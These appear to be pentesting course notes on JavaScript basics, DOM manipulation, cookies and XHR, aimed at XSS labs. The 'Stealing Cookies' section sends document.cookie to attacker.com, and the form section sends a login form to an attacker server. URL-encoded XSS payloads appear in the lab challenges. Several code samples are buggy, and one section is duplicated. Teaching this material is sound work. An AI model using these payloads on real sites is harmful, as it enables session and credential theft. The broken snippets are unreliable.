
### Javascript Introduction
-------------------------------------------------
 - Invented at Netscape
 - Provides interactivity with the user
 - Client side scripting language -> runs within browser sandbox
 - JS is case sensitive
 - Browser executes JS sequentially as it encounters it

### Variables
---------------------------------------------------
* Dynamically Typed Language 
  – We do not need to declare data types
* Variable Naming
  - Case sensitive
  - Must begin with letter or _ and NOT a number
  - No reserve keywords

```javascript
var a; alert(a);  //undefined
var a = 100; alert(a);  // 100
var a = "Hello World"; alert(a);  // Hello World
var a = 'Hello World'; alert(a);  // Hello World
var a = true; alert(a);  // true //boolean value
var a = false; alert(a);  // false // boolean value 
```

* Variable Scope
 1) Local
 2) Global
 
 ```javascript
    var global_var =100;
    function ScopeDemo()
    {
     var global_var =200;
     return global_var;
    }
    
    var m = ScopeDemo();
    alert(m);    // 200; local variables can overshadow global variables
 ```

### Operators
----------------------------------------------------
* Arithmetic Operators
```javascript
+ - * / % ++ --
```

```javascript
var m = 100;
var n = 20;
alert(m+n);   // 120
alert(m++);   // displays 100 and then increments m
alert(++m);   // 101  
```

* Assignment Operators
```javascript
= += -= *=
```

```javascript
alert(m=n);  // 20
alert(m+=n);  // 120
alert(m-=n);  // 80

```

* Comparison Operators
```javascript
== != > < >= <=`
```

* Logical Operators
```javascript
&& || !
```

### Conditions
------------------------------------------------
**if - else**
```javascript
var b = 5000;

if (b < 500) {
  alert("b less than 500");
}
else if (b == 500){
  alert("b equal to 500");
}
else {
  alert("b greater than 500");
}
```

**Switch** 
```javascript
var name = 'z-r0crypt';

switch (name) {
  case 'z-r0crypt' :
              alert('z-r0crypt');
              break;
  case 'jack' :
              alert('jack');
              break;
  default :
              alert('unknown name');
}
```

### Loops
------------------------------------------------
**while Loop**
```javascript
while (condition is true) {
      .....steatements....
}
```

**For Loop**
```javascript
for ( initialization; test condition; iteration) {
     .....statements.....
}
```


### Functions
---------------------------------------------

* Block of code made reusable
```javascript
   function Function_Name (argument_list) 
   {
     ...
     ...
     return Return_Value;
   }
```

### Data Types
-------------------------------------------

**Numbers**
```javascript
var x = 10;
var x = 10.12;
```

**Strings**
```javascript
var demo = “this is a string”;
var demo = ‘this is a string’;
var demo = “this is a string’s”;
```

**Boolean**
```javascript
var truth = true;
var fake = false;
```

**Array**
```javascript
var demo = [“XSS”, “CSRF”, “SQLi”]
var demo = new Array(“XSS”, “CSRF”, “SQLi”)

var demo = new Array()
demo[0] = “XSS”
```

#### Objects
* Properties – Values / Data
* Methods – Associated Actions
* e.g. Vulnerability Object
    - CVE Number is property
    - IsVulnerable() is a method

* JS is Prototype Based
    - no classes like in other Object Oriented Languages


**Accessing Object Properties & Methods**
 * Object_Name.Property_Name
 * Object_Name.Method_Name(arg)

```javascript
  function Vulnerable(description, cveid){
     this.description = description;
     this.cveid = cveid; 
     
     this.alertVulnerabilityDetasils = function () {  // method inside object
      
         alert(this.description+':'+this.cveid);
     }
  }
  
  var vuln1 = new Vulnerable("XSS in PHPB", 1234);
  alert(vuln1.description);
  alert(vuln1.cveid);
  
  vuln1.alertVeulnerabilityDetails();
  
  Vulnerable.prototype.isVulnerable = function() { alert('XSS'); };
  
  vuln1.isVulnerable();
 
```

### Enumerating Object Properties
---------------------------------------------------------

 + **for...in**
    - Iterates over the enumerable properties of an object, in arbitrary order. For each distinct propert, statements can be executed.
    - https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/for...in
   
   ```javascript
     //using the same code as in above(object)
     
     for (prop in vuln1) {
         alert(prop + ' : ' +vuln1[prop]);
     }
     
   ```

+ **Object.keys()**
    - The Object.keys() method return an array of a fiven objects own enumerable properties, in the same order as that provided by a for...in loop (the difference being that a for-in loop enumerates properties inthe prototype chain as well).
    - https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/keys

```javascript
   alert(Object.keys(vuln1));

```
+ **Object.getOwnPropertyNames()** 
    - It returns an array of all properties(enumerable or not) found directly upon a given object.
    - https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/getOwnPropertyNames
```javascript
   alert(Object.getOwnPropertyNames(vuln1));
```


### HTML DOM(Document Object Model)
-----------------------------------------

**Document Object Model (DOM)**
  - DOM is an API for manipulating HTMLand XML documents. It provides a structural representation of the document enabling you to modify its content and visual presentation by using a scripting langueage such as Javascript.
  - https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model

   - **What is the Document Object Model?** : https://www.w3.org/TR/REC-DOM-Level-1/introduction.html

* Finding any HTML elements of interest to us
   - getElementById()
   - getElementsByTagName()

* Modify
   - .innerHTML = ""

```html
<html>
 <body> 
  <h1 id="title"> Welcome to Javascript for Pentesters"</h1>
  <h2> This is the first H2 tag </h2>
  <h2> This is the Second H2 tag </h2>
  <script>
      var var1 = document.getElementById("title");
      alert("This is a break");
      var1.innerHTML = "XSS for pentesters";
      var h2tags = document.getElementsByTagName("h2");
      alert("Number of H2 tags "+h2tags.length);
      h2tags[1].innerHTML = "This is the Modified second H2 tag";
   // Iterate through tags
     for(i=0; i < h2tags.length; i++) 
     {
        alert(h2tags[i].innerHTML);
     }
                                
  </script>
 </body>
</html>

```


### Event Handlers
-----------------------------------

* Events – Click, Mouse over etc.
* Event Handlers provide a mechanism to react to these events
* **Event Handler Lists:** https://developer.mozilla.org/en-US/docs/Web/Guide/Events/Event_handlers

```html
   
  <h1 id="js" onclick=alert("onclick handler")>Welcome to JS for Pentesters </h1>
  <h2 id="js1">Welcome to JS for Pentesters </h2>
  <h2 id="js2">Welcome to JS for Pentesters </h2>
<script>
   document.getElementById("js1").onmouseover = function(event) { alert("Onmouseover Event Handler"); };
 
  document.getElementById("js2").addEventListener('mouseover', unction(event) { alert("Onmouseover Event Handler addEvent Listner"); }, false;
</script>
```


### HTML DOM(Document Object Model)
-----------------------------------------

**Document Object Model (DOM)**
  - DOM is an API for manipulating HTMLand XML documents. It provides a structural representation of the document enabling you to modify its content and visual presentation by using a scripting langueage such as Javascript.
  - https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model

   - **What is the Document Object Model?** : https://www.w3.org/TR/REC-DOM-Level-1/introduction.html

* Finding any HTML elements of interest to us
   - getElementById()
   - getElementsByTagName()

* Modify
   - .innerHTML = ""

```html
<html>
 <body> 
  <h1 id="title"> Welcome to Javascript for Pentesters"</h1>
  <h2> This is the first H2 tag </h2>
  <h2> This is the Second H2 tag </h2>
  <script>
      var var1 = document.getElementById("title");
      alert("This is a break");
      var1.innerHTML = "XSS for pentesters";
      var h2tags = document.getElementsByTagName("h2");
      alert("Number of H2 tags "+h2tags.length);
      h2tags[1].innerHTML = "This is the Modified second H2 tag";
   // Iterate through tags
     for(i=0; i < h2tags.length; i++) 
     {
        alert(h2tags[i].innerHTML);
     }
                                
  </script>
 </body>
</html>

```


### Event Handlers
-----------------------------------

* Events – Click, Mouse over etc.
* Event Handlers provide a mechanism to react to these events
* **Event Handler Lists:** https://developer.mozilla.org/en-US/docs/Web/Guide/Events/Event_handlers

```html
   
  <h1 id="js" onclick=alert("onclick handler")>Welcome to JS for Pentesters </h1>
  <h2 id="js1">Welcome to JS for Pentesters </h2>
  <h2 id="js2">Welcome to JS for Pentesters </h2>
<script>
   document.getElementById("js1").onmouseover = function(event) { alert("Onmouseover Event Handler"); };
 
  document.getElementById("js2").addEventListener('mouseover', unction(event) { alert("Onmouseover Event Handler addEvent Listner"); }, false;
</script>
```

### Cookies
----------------------------------------

 * Set
 * Modify
 * Delete
 * https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie


```javascript
 
   document.cookie = "sessionid=1212342345345646;";
   document.cookie = "userid=999;";

   alert(document.cookie);
   
   //iterate through cookies
   
   cookies = document.cookie.split(';');
   for (var i=0; i < cookie.length; i++)
   {
       alert(cookies[i]);
   }
   
   //Remove a cookie - set a past date in expires attribute
   
   document.cookie = "sessionid=1212342345345646; expires=Fri, 24 jan 2020 00:00:00 GMT;"; 
   alert(document.cookie);
   
```


### Stealing Cookies
-----------------------------------------

 * `document.location`
 * `<img src="....." />`
 * `<img src="..." height="1" width="1" />`
 * `new Image().src = "..."`

```javascript
    //1
    document.location = "http://attacker.com/test.html/?"+document.cookie;
    
    //2
    document.write('<img src="http://attacker.com/?"'+document.cookie + ' />');
    
    //3
     document.write('<img height="1" width="1" src="http://attacker.com/?"'+document.cookie +' />');
    
    //4
    new Image().src = "http://attacker.com/?"+document.cookie;
```

### Exceptions
----------------------------------------------
 * Errors happen
 * Errors need to be handled gracefully
 * try – catch – finally
 * https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/try...catch
 
 ```javascript
    try {
       DoesNotExist();
    } catch {
       document.write("Error was : " + err.message);
    } finally {
       document.write("<br/>Runs regardless of if Error happens or not");
    }
    
  //Define Custom Exception  
    try {  
       throw "This is a custom exception";
    } catch {
       document.write("Error was : " + err);
    } finally {
       document.write("<br/>Runs regardless of if Error happens or not");
    }
 ```

### Advanced Form Manipulation
---------------------------------------------
* Intercepting a form submit - before data is submitted to the server
* Reading / Modifying values in the form
* Posting form to Attacker controlled server

```html
 // Simple Login form
 <form id="test" action="/authenticate" method="GET">
     Username: <input type="text" name="username" />
     <br>
     Password: <input type="password" name="pass" />
     <input type="submit" name="submit" />
 </form>
```
```javascript
 
 <script>
    function InterceptForm() {
       //Reading Form values inserted by user
       alert(document.forms["test"]["username"].value);
       alert(document.forms["test"]["password"].value);
       
       //if ID is not mentioned
       alert(document.forms[0].elements[0].value);
       alert(document.forms[0].elements[1].value);
       return false;
       
       //modifying form values
       document.forms[0].elements[0].value = 'Jacob';
       
       //Posting form to Attacker controlled server 
       document.forms[0].action = 'http://attacker.com/';
       return true;
    }
    
    test.onsubmit = InterceptForm;
 </script>

```

### HTML Parsing with XMLHttpRequest
-----------------------------------------------------------
* **Why HTML Parsing?**
* XSS can be used to traverse the application
* HTML Pages might need to be processed - extract token
* Text based treatment is painful
* DOM based parsing is required


#### XHR
* HTML support is not available in synchronous mode.
* HTML support is only available if the responseType property has been set to 'document'
* https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/HTML_in_XMLHttpRequest
* https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest

##### Challenge 1

 * http://pentesteracademylab.appspot.com/lab/webapp/jfp/xhr?url=www
 * http://pentesteracademylab.appspot.com/lab/webapp/jfp/xhr/data
 * http://meyerweb.com/eric/tools/dencoder/

Before encoding :-
```javascript
<script>

var req = new XMLHttpRequest();
req.onreadystatechange = function ()
{
   if (req.readyState == 4 && req.status == 200)
      {
         var htmlPage = req.responseXML;
         links = htmlPage.getElementsByTagName("a");
         result = '';
         for (i=0; i< links.length; i++) {
             result += links[i] + "<br>";
         }
         document.getElementById("result").innerHTML = result;
      }

}

req.open("GET", "/lab/webapp/jfp/2", true);
req.responseType = "document";
req.send();

</script>
```


### XHR and JSON Parsing
---------------------------------------------------

#### What is JSON?
* JavaScript Object Notation
* text based data exchange
* human readable
* hierarchical data
* AJAX applications - alternate to XML

#### Why JSON Parsing?
* XSS can be used to traverse the application
* Most modern web applications use API based access
* Response type is JSON in a large majority

##### Challenge 2
 * http://pentesteracademylab.appspot.com/lab/webapp/jfp/json?url=xxx
 * http://pentesteracademylab.appspot.com/lab/webapp/jfp/json/data
 * http://meyerweb.com/eric/tools/dencoder/

Before encoding :-
```javascript
<script>
var req = new XMLHttpRequest();
req.onreadystatechange = function ()
{
   if (req.readyState == 4 && req.status == 200)
      {
         response_obj = JSON.parse(req.responseText);
         alert(response_obj.num1.version);
         document.getElementById("result").innerHTML = response_obj.num1.software + " " + response_obj.num1.version + " " + response_obj.num1.description;
      }
}
req.open("GET", "/lab/webapp/jfp/json/data", true);
req.send();
</script>
```
After encoding :-
```javascript
%3Cscript%3E%0Avar%20req%20%3D%20new%20XMLHttpRequest()%3B%0Areq.onreadystatechange%20%3D%20function%20()%0A%7B%0A%20%20%20if%20(req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200)%0A%20%20%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%20response_obj%20%3D%20JSON.parse(req.responseText)%3B%0A%20%20%20%20%20%20%20%20%20alert(response_obj.num1.version)%3B%0A%20%20%20%20%20%20%20%20%20document.getElementById(%22result%22).innerHTML%20%3D%20response_obj.num1.software%20%2B%20%22%20%22%20%2B%20response_obj.num1%2Cversion%20%2B%20%22%20%22%20%2B%20response_obj.num1.description%3B%0A%20%20%20%20%20%20%7D%0A%7D%0Areq.open(%22GET%22%2C%20%22%2Flab%2Fwebapp%2Fjfp%2Fjson%2Fdata%22%2C%20true)%3B%0Areq.send()%3B%0A%3C%2Fscript%3E
```
```http
http://pentesteracademylab.appspot.com/lab/webapp/jfp/json?url=%3Cscript%3E%0Avar%20req%20%3D%20new%20XMLHttpRequest()%3B%0Areq.onreadystatechange%20%3D%20function%20()%0A%7B%0A%20%20%20if%20(req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200)%0A%20%20%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%20response_obj%20%3D%20JSON.parse(req.responseText)%3B%0A%20%20%20%20%20%20%20%20%20alert(response_obj.num1.version)%3B%0A%20%20%20%20%20%20%20%20%20document.getElementById(%22result%22).innerHTML%20%3D%20response_obj.num1.software%20%2B%20%22%20%22%20%2B%20response_obj.num1.version%20%2B%20%22%20%22%20%2B%20response_obj.num1.description%3B%0A%20%20%20%20%20%20%7D%0A%7D%0Areq.open(%22GET%22%2C%20%22%2Flab%2Fwebapp%2Fjfp%2Fjson%2Fdata%22%2C%20true)%3B%0Areq.send()%3B%0A%3C%2Fscript%3E
```


### XHR and XML Parsing
---------------------------------------------------

##### Challenge 3
 * http://pentesteracademylab.appspot.com/lab/webapp/jfp/xml?url=xxx
 * http://pentesteracademylab.appspot.com/lab/webapp/jfp/xml/data
 * http://meyerweb.com/eric/tools/dencoder/

```javascript
<script>
var req = new XMLHttpRequest();
req.onreadystatechange = function ()
{
   if (req.readyState == 4 && req.status == 200)
      {
         titles = req.responseXML.getElementsByTagName("title");
         for (i=0; i< titles.length; i++) {
             alert(titles[i].childNodes[0].nodeValue0;
         }
      }
}
req.open("GET", "/lab/webapp/jfp/xml/data", true);
req.send();
</script>
```
